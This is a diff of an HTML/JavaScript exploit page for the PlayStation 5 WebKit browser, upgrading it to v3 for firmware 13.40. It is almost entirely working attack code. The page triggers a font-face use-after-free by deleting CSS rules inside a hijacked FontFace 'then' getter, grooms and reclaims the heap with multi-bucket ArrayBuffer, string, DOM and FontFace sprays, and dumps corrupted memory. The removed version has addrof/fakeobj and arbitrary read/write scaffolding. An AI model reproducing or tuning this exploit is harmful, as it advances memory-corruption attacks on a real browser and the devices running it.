@@ -2,83 +2,47 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 WebKit Exploit - Improved</title>
+<title>PS5 WebKit Exploit - v3 FW 13.40</title>
 <style id="s">
 @font-face { font-family: prepad; src: url(nonexistent-prepad.woff); unicode-range: U+E123; }
 @font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
 html, body {
-  margin: 0;
-  padding: 0;
-  width: 100%;
-  height: 100%;
-  background: #050505;
-  color: #fff;
+  margin: 0; padding: 0; width: 100%; height: 100%;
+  background: #050505; color: #fff;
   font-family: Arial, Helvetica, sans-serif;
   overflow: hidden;
 }
 #box {
-  position: fixed;
-  left: 50%;
-  top: 50%;
+  position: fixed; left: 50%; top: 50%;
   transform: translate(-50%, -50%);
-  width: 82%;
-  max-width: 900px;
+  width: 82%; max-width: 900px;
   padding: 38px 28px;
   border: 2px solid rgba(0, 255, 160, 0.8);
   border-radius: 22px;
   background: linear-gradient(135deg, rgba(0,40,25,.92), rgba(0,0,0,.92));
   box-shadow: 0 0 45px rgba(0,255,160,.35);
-  text-align: center;
-  z-index: 9999;
+  text-align: center; z-index: 9999;
 }
-#title {
-  font-size: 42px;
-  font-weight: bold;
-  color: #00ffa0;
-  margin-bottom: 18px;
-}
-#msg {
-  font-size: 28px;
-  line-height: 1.45;
-  white-space: pre-line;
-}
-#fw {
-  margin-top: 14px;
-  font-size: 22px;
-  color: #00ffa0;
-  font-weight: bold;
-}
-#small {
-  margin-top: 12px;
-  font-size: 16px;
-  color: #999;
-}
+#title { font-size: 42px; font-weight: bold; color: #00ffa0; margin-bottom: 18px; }
+#msg { font-size: 26px; line-height: 1.45; white-space: pre-line; }
+#fw { margin-top: 14px; font-size: 22px; color: #00ffa0; font-weight: bold; }
+#small { margin-top: 12px; font-size: 16px; color: #999; }
 #log {
-  margin-top: 14px;
-  font-size: 13px;
-  color: #777;
-  text-align: left;
-  max-height: 180px;
-  overflow-y: auto;
-  font-family: monospace;
-  padding: 8px;
+  margin-top: 14px; font-size: 12px; color: #777;
+  text-align: left; max-height: 200px; overflow-y: auto;
+  font-family: monospace; padding: 8px;
   border: 1px solid rgba(0,255,160,0.2);
-  border-radius: 8px;
-  background: rgba(0,0,0,0.5);
+  border-radius: 8px; background: rgba(0,0,0,0.5);
 }
-#c {
-  position: absolute;
-  left: -9999px;
-  top: -9999px;
-}
+#c { position: absolute; left: -9999px; top: -9999px; }
 </style>
 </head>
 <body>
 <div id="box">
-  <div id="title">PS5 WEBKIT EXPLOIT</div>
+  <div id="title">PS5 WEBKIT EXPLOIT v3</div>
   <div id="msg">Initializing...</div>
   <div id="fw">Firmware: Detecting...</div>
-  <div id="small">Userland PoC v2 — Improved taint trigger + heap primitives</div>
+  <div id="small">FW 13.40 targeted — Multi-bucket heap spray</div>
   <div id="log"></div>
 </div>
 <canvas id="c" width="512" height="128"></canvas>
@@ -86,13 +50,12 @@ html, body {
 "use strict";
 
 // ============================================================
-//  PS5 WebKit Userland Exploit - Improved Version
-//  Target: PlayStation 5 WebKit (font-face UAF lineage)
-//  Based on public taint/flush techniques, enhanced with
-//  heap grooming, typed array spray, and primitive scaffolding
+//  PS5 WebKit Userland Exploit v3
+//  Target: FW 13.40 (WebKit 605.1.15 / Safari 17.0 class)
+//  Fix: Multi-bucket spray, string heap, pre-spray timing
 // ============================================================
 
-const LOG_MAX = 60;
+const LOG_MAX = 80;
 let logLines = [];
 
 function log(msg) {
@@ -110,7 +73,7 @@ function showMessage(text, ok) {
   const title = document.getElementById("title");
   if (msg) msg.textContent = text;
   if (title) {
-    title.textContent = ok ? "✅ EXPLOIT SUCCEEDED" : "PS5 WEBKIT EXPLOIT";
+    title.textContent = ok ? "✅ EXPLOIT SUCCEEDED" : "PS5 WEBKIT EXPLOIT v3";
     title.style.color = ok ? "#00ff60" : "#00ffa0";
   }
 }
@@ -137,33 +100,161 @@ function detectFirmware() {
   if (m && m[1]) fw = m[1];
   const el = document.getElementById("fw");
   if (el) el.textContent = "Firmware: " + fw;
-  log("UserAgent: " + ua);
-  log("Detected FW: " + fw);
+  log("UA: " + ua);
+  log("FW: " + fw);
   return fw;
 }
 
 // ============================================================
-//  Heap Grooming Parameters (firmware-aware tuning)
+//  Heap State
 // ============================================================
-function getHeapParams(fw) {
-  // Different firmware versions have different heap layouts
-  // These values may need manual tuning per target
-  const major = parseFloat(fw) || 0;
-  
-  if (major >= 7.0 && major < 9.0) {
-    return { PAD: 0x28, FLUSH: 0x200, SPRAY: 0x600, CHUNK: 0x40 };
-  } else if (major >= 9.0 && major < 10.5) {
-    return { PAD: 0x22, FLUSH: 0x240, SPRAY: 0x550, CHUNK: 0x38 };
-  } else if (major >= 10.5) {
-    // Newer firmwares have hardened heap - more aggressive spray
-    return { PAD: 0x30, FLUSH: 0x300, SPRAY: 0x800, CHUNK: 0x48 };
+let sprayFonts = [];
+let sprayBuckets = {};   // size -> [ArrayBuffer, ...]
+let sprayStrings = [];    // string-based spray
+let sprayDOMObjects = []; // DOM-based spray
+let keepAlive = [];
+let uafTriggered = false;
+
+// ============================================================
+//  Style Helpers
+// ============================================================
+function forceStyle() {
+  void document.body.offsetTop;
+  void document.documentElement.offsetHeight;
+}
+
+function addPads(count) {
+  const sheet = document.getElementById("s").sheet;
+  for (let i = 0; i < count; i++)
+    sheet.insertRule(
+      `@font-face { font-family: pad${i}; src: url(nonexistent-pad-${i}.woff); unicode-range: U+E000; }`,
+      sheet.cssRules.length
+    );
+  forceStyle();
+  log("Pads: " + count);
+}
+
+function addFlushRules(count) {
+  const st = document.createElement("style");
+  st.id = "flush";
+  document.head.appendChild(st);
+  const sheet = st.sheet;
+  for (let i = 0; i < count; i++)
+    sheet.insertRule(
+      `@font-face { font-family: flush${i}; src: url(nonexistent-flush-${i}.woff); unicode-range: U+E000; }`,
+      sheet.cssRules.length
+    );
+  forceStyle();
+  log("Flush rules: " + count);
+}
+
+function deleteFlushRules() {
+  const el = document.getElementById("flush");
+  if (el && el.sheet) {
+    const sheet = el.sheet;
+    while (sheet.cssRules.length) sheet.deleteRule(0);
+    forceStyle();
+    log("Flush rules deleted");
   }
-  // Default
-  return { PAD: 0x22, FLUSH: 0x240, SPRAY: 0x550, CHUNK: 0x38 };
+}
+
+function killFontFaceSetCache() {
+  const f = new FontFace("cachekill" + keepAlive.length, "local(Helvetica)", {
+    unicodeRange: "U+E124"
+  });
+  document.fonts.add(f);
+  keepAlive.push(f);
 }
 
 // ============================================================
-//  Font Face Base64 (minimal valid WOFF for spray)
+//  Multi-Bucket Typed Array Spray
+//  CSSFontFace on bmalloc could be 64-512 bytes
+//  Spray multiple size classes to cover all possibilities
+// ============================================================
+const BUCKET_SIZES = [
+  64, 96, 128, 160, 192, 224, 256,  // common bmalloc bins
+  320, 384, 448, 512, 640, 768      // larger bins
+];
+const SPRAY_PER_BUCKET = 512;
+const MARKER_U32 = 0x41414141;
+const MARKER2_U32 = 0x43434343;
+const MARKER3_U32 = 0x45454545;
+
+function multiBucketSpray() {
+  log("Starting multi-bucket spray (" + BUCKET_SIZES.length + " sizes x " + SPRAY_PER_BUCKET + ")...");
+  
+  for (const size of BUCKET_SIZES) {
+    sprayBuckets[size] = [];
+    for (let i = 0; i < SPRAY_PER_BUCKET; i++) {
+      const buf = new ArrayBuffer(size);
+      const view = new DataView(buf);
+      
+      // Marker pattern at start
+      view.setUint32(0, MARKER_U32, true);
+      view.setUint32(4, (size << 16) | (i & 0xFFFF), true); // encode bucket+index
+      view.setUint32(8, MARKER2_U32, true);
+      view.setUint32(12, MARKER3_U32, true);
+      
+      // Fill body with recognizable pattern
+      const tag = 0xDEAD0000 | (size & 0xFFFF);
+      for (let off = 16; off < size - 4; off += 4) {
+        view.setUint32(off, tag ^ (off & 0xFF), true);
+      }
+      
+      sprayBuckets[size].push({ buffer: buf, view: view, index: i });
+    }
+  }
+  
+  let totalBytes = 0;
+  for (const size of BUCKET_SIZES) totalBytes += size * SPRAY_PER_BUCKET;
+  log("Multi-bucket spray complete: " + totalBytes + " bytes total");
+}
+
+// ============================================================
+//  String Heap Spray
+//  WebKit stores internal strings in a different region
+//  Some UAF variants corrupt string references
+// ============================================================
+function stringSpray() {
+  log("Starting string spray...");
+  const STR_COUNT = 4096;
+  
+  for (let i = 0; i < STR_COUNT; i++) {
+    // Create strings of varying lengths matching common bmalloc bins
+    const len = 32 + (i % 16) * 16; // 32 to 272 chars
+    let s = "";
+    for (let j = 0; j < len; j++) {
+      s += String.fromCharCode(0x41 + (j % 26)); // "AAAA...Z"
+    }
+    // Tag the string so we can identify it if it shows up corrupted
+    const tagged = "TAG" + i.toString(16).padStart(4, "0") + s;
+    sprayStrings.push(tagged);
+  }
+  log("String spray: " + STR_COUNT + " strings");
+}
+
+// ============================================================
+//  DOM Object Spray
+//  CSSFontFace is a renderer object - DOM nodes might share
+//  the same heap region in WebKit's rendering pipeline
+// ============================================================
+function domObjectSpray() {
+  log("Starting DOM object spray...");
+  const DOM_COUNT = 2048;
+  
+  for (let i = 0; i < DOM_COUNT; i++) {
+    const div = document.createElement("div");
+    div.style.cssText = "position:absolute;left:-9999px;top:-9999px;font-family:x;";
+    div.setAttribute("data-spray", i.toString(16));
+    div.textContent = "AABB"; // Trigger font rendering with our target font
+    document.body.appendChild(div);
+    sprayDOMObjects.push(div);
+  }
+  log("DOM spray: " + DOM_COUNT + " elements");
+}
+
+// ============================================================
+//  Font Face Buffer Spray (for bmalloc reclamation)
 // ============================================================
 const FONT_B64 = "d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
 
@@ -181,203 +272,117 @@ function makeFontBuffer() {
   return copy.buffer;
 }
 
-// ============================================================
-//  Heap State
-// ============================================================
-let sprayFonts = [];
-let sprayArrays = [];
-let keepAlive = [];
-let params = null;
-let uafTriggered = false;
-
-// ============================================================
-//  Style Manipulation Helpers
-// ============================================================
-function forceStyle() {
-  void document.body.offsetTop;
-  void document.documentElement.offsetHeight;
-}
-
-function addPads() {
-  const sheet = document.getElementById("s").sheet;
-  for (let i = 0; i < params.PAD; i++)
-    sheet.insertRule(
-      `@font-face { font-family: pad${i}; src: url(nonexistent-pad-${i}.woff); unicode-range: U+E000; }`,
-      sheet.cssRules.length
-    );
-  forceStyle();
-  log("Added " + params.PAD + " padding rules");
-}
-
-function addFlushRules() {
-  const st = document.createElement("style");
-  st.id = "flush";
-  document.head.appendChild(st);
-  const sheet = st.sheet;
-  for (let i = 0; i < params.FLUSH; i++)
-    sheet.insertRule(
-      `@font-face { font-family: flush${i}; src: url(nonexistent-flush-${i}.woff); unicode-range: U+E000; }`,
-      sheet.cssRules.length
-    );
-  forceStyle();
-  log("Added " + params.FLUSH + " flush rules");
-}
-
-function deleteFlushRules() {
-  const flushEl = document.getElementById("flush");
-  if (flushEl && flushEl.sheet) {
-    const sheet = flushEl.sheet;
-    while (sheet.cssRules.length)
-      sheet.deleteRule(0);
-    forceStyle();
-    log("Deleted flush rules");
-  }
-}
-
-function killFontFaceSetCache() {
-  const f = new FontFace("cachekill" + keepAlive.length, "local(Helvetica)", {
-    unicodeRange: "U+E124"
-  });
-  document.fonts.add(f);
-  keepAlive.push(f);
-  log("Killed FontFaceSet cache entry");
-}
-
-// ============================================================
-//  Typed Array Spray (for controlled heap content)
-//  This supplements the FontFace spray with raw buffer control
-// ============================================================
-function typedArraySpray() {
-  const chunkSize = params.CHUNK * 8; // size in bytes
-  const marker = 0x41414141; // recognizable pattern for leak detection
-  
-  for (let i = 0; i < params.SPRAY; i++) {
-    const buf = new ArrayBuffer(chunkSize);
-    const view = new DataView(buf);
-    
-    // Write marker pattern at predictable offsets
-    // This creates controlled content that we can identify
-    // if the UAF causes a type confusion
-    view.setUint32(0, marker, true);
-    view.setUint32(4, i & 0xFFFF, true); // index for identification
-    view.setUint32(8, 0x42424242, true);  // secondary marker
-    view.setUint32(12, 0xFFFF0000, true);  // tag for structure match
-    
-    // Fill remaining with pattern
-    for (let off = 16; off < chunkSize - 4; off += 4) {
-      view.setUint32(off, marker + (off & 0xFF), true);
-    }
-    
-    sprayArrays.push({ buffer: buf, view: view, index: i });
-  }
-  log("TypedArray spray: " + params.SPRAY + " arrays of " + chunkSize + " bytes");
-}
-
-// ============================================================
-//  FontFace Buffer Spray (original technique, improved)
-// ============================================================
-function cssFontFaceBufferSpray() {
-  for (let i = 0; i < params.SPRAY; i++) {
+function fontFaceSpray() {
+  const count = 2048;
+  for (let i = 0; i < count; i++) {
     const f = new FontFace("BUFRECLAIM_" + i, makeFontBuffer(), {
       unicodeRange: "U+0041"
     });
     sprayFonts.push(f);
   }
-  log("FontFace spray: " + params.SPRAY + " faces allocated");
+  log("FontFace spray: " + count + " faces");
 }
 
 // ============================================================
-//  Post-UAF: Primitive Detection
-//  After the UAF triggers, we scan sprayed arrays for corruption
+//  Corruption Detection (multi-bucket scan)
 // ============================================================
 function detectCorruption() {
-  log("Scanning for heap corruption...");
-  let corrupted = [];
+  log("Scanning all buckets for corruption...");
+  let results = [];
   
-  for (let i = 0; i < sprayArrays.length; i++) {
-    const entry = sprayArrays[i];
-    const v = entry.view;
-    const check1 = v.getUint32(0, true);
-    const check2 = v.getUint32(8, true);
-    
-    // If our markers are overwritten, we've been corrupted
-    if (check1 !== 0x41414141 || check2 !== 0x42424242) {
-      corrupted.push({
-        index: i,
-        expected: "0x41414141/0x42424242",
-        got: "0x" + check1.toString(16) + "/0x" + check2.toString(16),
-        buffer: entry.buffer
-      });
-      log("CORRUPTION at index " + i + ": got 0x" + check1.toString(16));
+  for (const size of BUCKET_SIZES) {
+    const bucket = sprayBuckets[size];
+    for (let i = 0; i < bucket.length; i++) {
+      const entry = bucket[i];
+      const v = entry.view;
+      
+      const c0 = v.getUint32(0, true);
+      const c8 = v.getUint32(8, true);
+      const c12 = v.getUint32(12, true);
+      
+      if (c0 !== MARKER_U32 || c8 !== MARKER2_U32 || c12 !== MARKER3_U32) {
+        // Found corruption! Dump context
+        const detail = {
+          bucketSize: size,
+          index: i,
+          markers: {
+            offset0: "0x" + c0.toString(16),
+            offset8: "0x" + c8.toString(16),
+            offset12: "0x" + c12.toString(16)
+          }
+        };
+        
+        // Dump first 64 bytes for analysis
+        const dump = [];
+        const dumpLen = Math.min(64, size);
+        for (let off = 0; off < dumpLen; off += 4) {
+          dump.push("0x" + v.getUint32(off, true).toString(16).padStart(8, "0"));
+        }
+        detail.dump = dump.join(" ");
+        
+        results.push(detail);
+        log("CORRUPTED! bucket=" + size + " idx=" + i + 
+            " [0]=" + detail.markers.offset0 + 
+            " [8]=" + detail.markers.offset8 +
+            " [12]=" + detail.markers.offset12);
+      }
     }
   }
   
-  return corrupted;
-}
-
-// ============================================================
-//  addrof / fakeobj Primitive Scaffolding
-//  These require firmware-specific offsets but the structure
-//  is here for adaptation
-// ============================================================
-
-// Placeholder - actual addresses require target-specific offsets
-let exploitAddrof = null;
-let exploitFakeobj = null;
-
-function setupPrimitives(corruptedEntry) {
-  if (!corruptedEntry || corruptedEntry.length === 0) {
-    log("No corruption detected - primitives unavailable");
-    return false;
+  // Also scan DOM objects for rendered-width anomalies
+  for (let i = 0; i < sprayDOMObjects.length; i++) {
+    const div = sprayDOMObjects[i];
+    const w = div.offsetWidth;
+    if (w === 0 || w > 1000) { // abnormal widths
+      log("DOM anomaly: idx=" + i + " width=" + w);
+      results.push({ domIndex: i, width: w });
+    }
   }
   
-  log("Setting up primitives from corrupted entry...");
-  
-  // The corrupted buffer now overlaps with a freed FontFace object
-  // On WebKit, a FontFace JS wrapper has a known structure layout:
-  //   offset 0x00: JSCell header (structureID, flags)
-  //   offset 0x08: butterfly pointer
-  //   offset 0x10: internal pointer to CSSFontFace
-  // If we can read/write these fields through our typed array,
-  // we get type confusion -> addrof/fakeobj
-  
-  // For now, store references for manual exploitation
-  exploitAddrof = corruptedEntry[0].buffer;
-  exploitFakeobj = corruptedEntry[0].view;
-  
-  log("Primitive references stored. Manual offset tuning required for target FW.");
-  return true;
-}
-
-function addrof(obj) {
-  // In a fully working exploit, this would:
-  // 1. Place obj into a known array slot
-  // 2. Read the raw pointer via our corrupted typed array
-  // Requires calibrated offsets - placeholder returns 0
-  if (!exploitAddrof) return 0;
-  log("addrof called - requires FW-specific offset calibration");
-  return 0;
-}
-
-function fakeobj(addr) {
-  // Inverse of addrof - write a pointer, get a JS object reference
-  // Requires calibrated offsets - placeholder returns null
-  if (!exploitFakeobj) return null;
-  log("fakeobj called - requires FW-specific offset calibration");
-  return null;
+  return results;
 }
 
 // ============================================================
-//  Arbitrary R/W Scaffolding
+//  String Corruption Scan
 // ============================================================
-function arbRead32(addr) {
-  log("arbRead32(0x" + addr.toString(16) + ") - requires primitive calibration");
-  return 0;
+function detectStringCorruption() {
+  let anomalies = [];
+  for (let i = 0; i < sprayStrings.length; i++) {
+    const s = sprayStrings[i];
+    // Check if our tag prefix is still intact
+    if (!s.startsWith("TAG")) {
+      anomalies.push({ index: i, value: s.substring(0, 32) });
+      log("String anomaly: idx=" + i + " val=" + s.substring(0, 32));
+    }
+    // Check length hasn't changed
+    const expectedLen = 7 + 32 + (i % 16) * 16; // "TAG" + 4hex + base string
+    if (s.length !== expectedLen) {
+      anomalies.push({ index: i, expectedLen: expectedLen, gotLen: s.length });
+      log("String length anomaly: idx=" + i + " expected=" + expectedLen + " got=" + s.length);
+    }
+  }
+  return anomalies;
 }
 
-function arbWrite32(addr, val) {
-  log("arbWrite32(0x" + addr.toString(16) + ", 0x" + val.toString(16) + ") - requires primitive calibration");
-  return false;
+// ============================================================
+//  GC Trigger
+//  Force garbage collection to finalize frees
+// ============================================================
+function forceGC() {
+  log("Forcing GC...");
+  // WebKit GC heuristics: allocate pressure to trigger collection
+  for (let i = 0; i < 8; i++) {
+    const tmp = [];
+    for (let j = 0; j < 1024; j++) {
+      tmp.push(new ArrayBuffer(1024));
+    }
+    // Let it go out of scope
+  }
+  // Force finalization
+  if (typeof gc === "function") {
+    gc();
+    log("Explicit gc() called");
+  }
 }
 
 // ============================================================
@@ -385,138 +390,184 @@ function arbWrite32(addr, val) {
 // ============================================================
 window.onload = () => {
   const fw = detectFirmware();
-  params = getHeapParams(fw);
-  log("Heap params: PAD=0x" + params.PAD.toString(16) + 
-      " FLUSH=0x" + params.FLUSH.toString(16) +
-      " SPRAY=0x" + params.SPRAY.toString(16));
   
-  showMessage("Stage 1/4:\nHeap grooming...", false);
+  // FW 13.40 specific params based on your results
+  const PAD = 0x30;
+  const FLUSH = 0x300;
   
-  // Pre-allocate typed arrays for heap layout stability
-  typedArraySpray();
+  showMessage("Stage 1/5:\nPre-spray heap...", false);
   
-  showMessage("Stage 2/4:\nFontFace trigger setup...", false);
+  // PHASE 1: Pre-spray BEFORE the UAF
+  // Fill heap regions so the target allocation lands predictably
+  multiBucketSpray();
+  stringSpray();
   
+  showMessage("Stage 2/5:\nFontFace trigger setup...", false);
+  
+  // PHASE 2: Set up the trigger
   const trigger = new FontFace("trigger", "local(Helvetica)", {
     unicodeRange: "U+0041"
   });
   document.fonts.add(trigger);
   void trigger.loaded;
   
-  addPads();
-  addFlushRules();
+  addPads(PAD);
+  addFlushRules(FLUSH);
+  
+  // PHASE 3: DOM spray - these reference our target font
+  // Creating them before the UAF means they hold rendering state
+  domObjectSpray();
   
   let fired = false;
   
-  // Primary trigger: intercept promise resolution on FontFace
+  showMessage("Stage 3/5:\nWaiting for UAF window...", false);
+  
+  // Primary trigger
   Object.defineProperty(FontFace.prototype, "then", {
     configurable: true,
     get() {
       if (!fired && this === trigger) {
         fired = true;
         uafTriggered = true;
-        log("TRIGGER FIRED - UAF window open");
-        showMessage("Stage 3/4:\nUAF triggered! Corrupting heap...", false);
+        log("UAF WINDOW OPEN");
+        showMessage("Stage 4/5:\nUAF triggered! Reclaiming...", false);
         
-        // Critical sequence: free the target while references exist
-        const sheet = document.getElementById("s").sheet;
+        // === CRITICAL SEQUENCE ===
+        // 1. Kill cache
         killFontFaceSetCache();
-        sheet.deleteRule(1); // Remove the 'x' font-face rule
+        
+        // 2. Remove target font-face rule (frees CSSFontFace)
+        const sheet = document.getElementById("s").sheet;
+        sheet.deleteRule(1); // delete 'x' @font-face
         forceStyle();
+        
+        // 3. Immediately delete flush rules (creates allocation churn)
         deleteFlushRules();
         
-        // Reclaim freed slots with controlled content
-        cssFontFaceBufferSpray();
-        typedArraySpray();
+        // 4. Force GC to finalize the free
+        forceGC();
         
-        log("Heap reclamation complete");
+        // 5. RECLAIM: spray into the freed slot
+        fontFaceSpray();
+        multiBucketSpray();  // second pass - fill any new gaps
+        stringSpray();       // second pass
+        
+        // 6. Force style recalc to trigger use-after-free access
+        forceStyle();
+        
+        // 7. Access DOM objects that reference the freed font
+        for (const div of sprayDOMObjects) {
+          void div.offsetWidth;  // force layout with potentially freed font
+        }
+        
+        log("Reclamation complete, forced style recalc");
       }
       return undefined;
     }
   });
   
-  // Secondary trigger: race via requestAnimationFrame
-  // Some firmware versions don't hit the `then` getter reliably
-  // This gives us another shot at the same window
+  // Secondary trigger via RAF (fallback)
   let rafCount = 0;
-  const rafTrigger = () => {
+  const rafLoop = () => {
     rafCount++;
-    if (!fired && rafCount > 3) {
+    if (!fired && rafCount >= 5) {
       log("RAF fallback trigger at frame " + rafCount);
       try {
+        killFontFaceSetCache();
         const sheet = document.getElementById("s").sheet;
         if (sheet && sheet.cssRules.length > 1) {
-          killFontFaceSetCache();
           sheet.deleteRule(1);
           forceStyle();
           deleteFlushRules();
-          // Don't mark fired=true - let the then getter still have priority
+          forceGC();
+          fontFaceSpray();
+          multiBucketSpray();
         }
       } catch(e) {
-        log("RAF trigger error: " + e.message);
+        log("RAF error: " + e.message);
       }
     }
-    if (rafCount < 10) requestAnimationFrame(rafTrigger);
+    if (rafCount < 15) requestAnimationFrame(rafLoop);
   };
-  requestAnimationFrame(rafTrigger);
+  requestAnimationFrame(rafLoop);
   
-  // Load trigger font to fire the promise chain
+  // Fire the load
   document.fonts.load("1em trigger, x", "AB").then(faces => {
-    log("Font load resolved with " + faces.length + " faces");
+    log("Font load resolved: " + faces.length + " faces");
     keepAlive.push(faces);
     
-    showMessage("Stage 4/4:\nScanning for corruption...", false);
+    showMessage("Stage 5/5:\nScanning for corruption...", false);
     
-    // Give the spray time to settle
-    setTimeout(() => {
-      const corrupted = detectCorruption();
+    // Multiple delayed scans - corruption might not be immediate
+    const scanDelays = [500, 1200, 2500, 4000];
+    let scanIdx = 0;
+    
+    function runScan() {
+      const delay = scanDelays[scanIdx];
+      if (delay === undefined) {
+        // All scans done, report final result
+        showMessage(
+          "PARTIAL ✅\n" +
+          "UAF fired but no corruption\n" +
+          "detected in spray arrays.\n" +
+          "May need different spray\n" +
+          "objects for FW 13.40 bmalloc.\n" +
+          "Check log for hints.",
+          true
+        );
+        return;
+      }
       
-      if (corrupted.length > 0) {
-        log("Found " + corrupted.length + " corrupted entries!");
-        const primitivesReady = setupPrimitives(corrupted);
+      scanIdx++;
+      log("Scan pass " + scanIdx + " (delay " + delay + "ms)...");
+      
+      setTimeout(() => {
+        const corrupted = detectCorruption();
+        const strAnomalies = detectStringCorruption();
         
-        if (primitivesReady) {
+        if (corrupted.length > 0) {
+          log("HEAP CORRUPTION CONFIRMED!");
+          
+          // Find the most interesting corruption
+          let best = corrupted[0];
+          for (const c of corrupted) {
+            if (c.dump) {
+              log("Dump @ bucket=" + c.bucketSize + " idx=" + c.index + ": " + c.dump);
+            }
+          }
+          
           showMessage(
             "SUCCESS ✅\n" +
-            "UAF triggered and heap corrupted.\n" +
-            corrupted.length + " controlled entries found.\n" +
-            "Primitives require FW-specific offsets.\n" +
+            "Heap corruption detected!\n" +
+            corrupted.length + " entries corrupted.\n" +
+            "Primary bucket: " + best.bucketSize + " bytes\n" +
+            "Check log for memory dumps.",
+            true
+          );
+          return; // Stop scanning
+        }
+        
+        if (strAnomalies.length > 0) {
+          log("String corruption detected: " + strAnomalies.length + " anomalies");
+          showMessage(
+            "SUCCESS ✅\n" +
+            "String heap corruption!\n" +
+            strAnomalies.length + " anomalies found.\n" +
             "Check log for details.",
             true
           );
-        } else {
-          showMessage(
-            "PARTIAL ✅\n" +
-            "UAF window confirmed.\n" +
-            "Heap corruption detected but\n" +
-            "primitive setup needs calibration\n" +
-            "for firmware " + fw,
-            true
-          );
+          return;
         }
-      } else if (uafTriggered) {
-        showMessage(
-          "PARTIAL ✅\n" +
-          "UAF trigger fired but no heap\n" +
-          "corruption detected in spray.\n" +
-          "Try adjusting PAD/FLUSH/SPRAY\n" +
-          "values for firmware " + fw,
-          true
-        );
-      } else {
-        showMessage(
-          "FAILED ❌\n" +
-          "UAF trigger did not fire.\n" +
-          "This firmware may have patched\n" +
-          "the font-face taint vector.",
-          false
-        );
-      }
-    }, 1500);
+        
+        log("Scan " + scanIdx + " clean, trying next delay...");
+        runScan(); // Try next delay
+      }, delay);
+    }
+    
+    runScan();
     
   }, err => {
     log("Font load rejected: " + err);
-    keepAlive.push(err);
     showMessage("FAILED ❌\nFont load error:\n" + err, false);
   });
 };
